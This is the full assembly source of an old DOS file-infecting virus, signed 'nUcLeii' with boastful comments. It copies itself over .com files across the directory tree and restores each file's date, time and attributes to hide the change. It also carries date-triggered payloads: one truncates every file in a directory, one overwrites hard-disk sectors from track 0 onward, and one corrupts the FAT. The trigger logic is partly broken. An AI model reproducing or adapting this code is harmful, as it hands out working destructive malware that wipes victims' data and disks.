;hmm.,.,.,.,without a name.,.,.,.,
;this file is much like the 606, only it
;is much more harmful...it has a special suprise
;for three diffrent dates....hehehehe.,.,,..,.,
;i had planned to have it in with the other TR-
;series, but this was much to large to add in with.,.,
;enjoy!....
;              nUcLeii
;	         [*v  i  a*]===[98]



.model tiny
.code

seg_a segment byte public
      ASSUME CS: SEG_A, DS: SEG_A, ES: SEG_A

filename equ  30          ;find file name
fileattr equ  21          ;find file attributes
filedate equ  24          ;find file date
filetime equ  22          ;fine file time

org 100h

main proc
start:
      call dirloc

infect:
       mov    dx, 100h
       mov    bx, handle
       mov    cx, 1203
       mov    ah, 40h
       int  21h
       ret

dirloc:
       mov    dx, offset dirdat     ;offset to hold new dta
       mov    ah, 1ah               ;set dta address
       int  21h

newdir:
       mov    ah,19h                ;get drive code
       int  21h
       mov    dl, al                ;save drive code
       inc    dl		    ;add one to dl (functions differ)
       mov    ah, 47h               ;get current directory
       mov    si, offset currentdir ;buffer to save directory in
       int  21h
       mov    dx, offset daroot     ;move dx to change to root
       mov    ah, 3bh		    ;change directory to root
       int  21h

find:
       mov    cx, 13h               ;include hidden/ro dir.
       mov    dx, offset wild       ;look for '*'
       mov    ah, 4eh               ;find file
       int  21h
       cmp    ax, 12h		    ;no file?
       jne    findmore    	    ;no dir? screw it then.

wank1:
      jmp    rollout

findmore:
        mov    ah, 4fh              ;find next target
        int  21h
        cmp    ax, 12h
        je    wank                  ;no more? crew it then.

keepgoin:
        mov    dx, offset dirdat+filename ;point dx to fcb-filename
        mov    ah, 3bh              ;change directory
        int  21h
        mov    ah, 2fh		    ;get current dta address
        int  21h
        mov    [diskdat], es	    ;save old segment
        mov    [diskdatofs], bx     ;save old offset
        mov    dx, offset filedat   ;offset to hold new dta
        mov    ah, 1ah		    ;set dta address
        int  21h

checkit:
        mov    cx, 07h		    ;find any attribute
        mov    dx, offset filetype  ;point dx to exe files
        mov    ah, 4eh		    ;find first file function
        int    21h
        cmp    ax, 12h		    ;was it found?
        jne    change

nextfile:
        mov    ah, 4fh		    ;find next file
        int  21h
        cmp    ax,12h               ;none found
        jne    change	            ;see what we can do...
        mov    dx, offset daroot    ;dx to change to root directory
        mov    ah, 3bh
        int  21h
        mov    ah, 1ah		    ;set dta address
        mov    ds, [diskdat]	    ;restore old segment
        mov    dx, [diskdatofs]	    ;restore old offset
        int  21h
        jmp    findmore
wank:
        jmp    rollout

change:
        mov    ah, 2fh		    ;temp. store dta
        int  21h
        mov    [tempseg], es	    ;save old segment
        mov    [tempofs], bx	    ;save old offset
        mov    dx, offset filedat+filename
        mov    bx, offset filedat   ;save file...
        mov    ax, [bx]+filedate    ;tha date
        mov    orig_date, ax
        mov    ax, [bx]+filetime    ;tha time
        mov    orig_time, ax
        mov    ax, [bx]+fileattr    ;tha attributes
        mov    ax, 4300h
        int  21h
        mov    orig_attr, cx
        mov    ax, 4301h	    ;change attributes
        xor    cx, cx		    ;clear attributes
        int  21h
        mov    ax, 3d00h 	    ;open file and read
        int  21h
        jc     fixup		    ;error?..go get another!
        mov    handle, ax	    ;save handle
        mov    ah, 3fh              ;read from file
        mov    bx, handle	    ;move handle to bx
        mov    cx, 02h		    ;read 2 bytes
        mov    dx, offset idbuffer  ;save to buffer
        int  21h
        mov    ah, 3eh		    ;close it for now
        mov    bx, handle	    ;load bx with handle
        int  21h
        mov    bx, idbuffer         ;give bx the id string
        cmp    bx, 02ebh            ;are we infected?
        jne    doit		    ;hmm...go get another.

fixup:
        mov    ah, 1ah		    ;set dta address
        mov    ds, [tempseg]	    ;restore old segment
        mov    dx, [tempofs]	    ;restore old offset
        int  21h
        jmp    nextfile

doit:
        mov    dx, offset filedat+filename
        mov    ax, 3d02h	    ;open victim read/write access
        int  21h
        mov    handle, ax	    ;save handle
        call   infect		    ;do your job...
       ;mov    ax, 3eh
       ;int  21h

rollout:
        mov    ax, 5701h	    ;restore original...
        mov    bx, handle	    ;handle
        mov    cx, orig_time	    ;time
        mov    dx, orig_date	    ;date
        int  21h
        mov    ax, 4301h	    ;and attributes
        mov    cx, orig_attr
        mov    dx, offset filedat+filename
        int  21h
       ;mov    bx, handle
       ;mov    ax, 3eh		    ;close em"
       ;int  21h		    
        mov    ah, 3bh   	    ;try this for speed...
        mov    dx, offset daroot
        int  21h
        mov    ah, 3bh		    ;change directory
        mov    dx, offset currentdir ;back to the original
        int  21h
        mov    ah, 2ah		    ;check system date
        int  21h
        cmp    cx, 1998		    ;hehe..if not then your already
        jb     getout               ;screwed an ill leave ya alone.
        cmp    dl, 15		    ;is it the 15th?...muhahaha
        jne    goaway		    ;not?...lucky you.
	cmp    dl, 19		    ;is it the 19th?...muhahaha
	je     alter_fat	    ;your gonna have a few crosslinks...
	cmp    dl, 29		    ;is it the 29th?...muhahaha
	je     ouch        	    ;your screwed,..,.,.,.,
        mov    dx, offset dirdat    ;offset to hold new dta
        mov    ah, 1ah		    ;set dta address
        int  21h
        mov    ah, 4eh		    ;find first file
        mov    cx, 7h
        mov    dx, offset allfiles  ;offset *.* ...hehehe...
	jmp    rockem

getout:
 	call   outta

goaway:
	call   outta

rockem:
        int  21h
        jc     goaway		    ;error? screw it then...
        mov    ax, 4301h	    ;find all "normal" files
        xor    cx, cx
        int  21h
        mov    dx, offset dirdat+filename
        mov    ah, 3ch		    ;write to all files in current dir.
        int  21h
        jc     outta		    ;error? screw it then...
        mov    ah, 4fh		    ;find next file
        jmp    rockem

ouch:
        xor    dx, dx            ;clear dx

rip_hd1:        
        mov    cx, 1             ;track 0, sector 1
        mov    ax, 311h          ;17 secs per track (hopefully!)
        mov    dl, 80h
        mov    bx, 5000h
        mov    es, bx
        int    13h               ;kill 17 sectors
        jae    rip_hd2           
        xor    ah, ah
        int    13h               ;reset disks if needed
rip_hd2:
        inc    dh                ;increment head number
        cmp    dh, 4             ;if head number is below 4 then
        jb     rip_hd1           ;go kill another 17 sectors
        inc    ch                ;increase track number and
        jmp    ouch              ;do it again

alter_fat:
        push dx
        push bx
        push cx
        push ax
        push bp               ;save regs that will be changed
        mov ax, 0dh
        int 21h               ;reset disk
        mov ah, 19h        
        int 21h               ;get default disk
        xor dx, dx            
        call load_sec         ;read in the boot record
        mov bp, bx
        mov bx, word ptr es:[bp+16h]  ;find sectors per fat
        push ax               ;save drive number
        call rnd_num          ;get random number
        cmp bx, ax            ;if random number is lower than
        jbe alter_fat1        ;secs per fat then jump and kill 'em
        mov ax, bx            ;else pick final sector of fat
alter_fat1:        
	
        int 26h               ;write same data in that fat
        pop bp        
        pop ax
        pop cx
        pop bx
        pop dx
        jmp outta

rnd_num:
        push cx
        push dx               ;save regs that will be changed
        xor ax, ax
        int 1ah               ;get system time
        xchg dx, ax           ;put lower word into ax
        pop dx
        pop cx
        ret                   ;restore values and return

load_sec:
        push cx
        push ds               ;save regs that will be changed
        push ax               ;save drive number
        push cs
        pop ds
        push cs
        pop es                ;make es and ds the same as cs
        mov ax, 0dh
        int 21h               ;reset disk
        pop ax                ;restore drive number
        mov cx, 1
        mov bx, offset sec_buf
        int 25h               ;read sector into buffer
        pop ds
        pop cx
        ret                   ;restore regs and return

outta:
        mov    ax, 4c00h	    ;end  program
        int  21h

words_     db  "nUcLeii~ *v. i. a*",0
words2     db  "1200..n0name",0
allfiles   db  "*.*",0
currentdir db  64 dup (?)
daroot     db  "\",0
dirdat     db  43 dup (?)
diskdat    dw  ?
diskdatofs dw  ?
filedat    db  43 dup (?)
filetype   db  "*.com",0
handle     dw  ?
idbuffer   dw  ?
orig_attr  dw  ?
orig_date  dw  ?
orig_time  dw  ?
sec_buf    dw 100h dup(?)
tempofs    dw  ?
tempseg    dw  ?
wild       db  "*",0

main endp
seg_a ends
end start
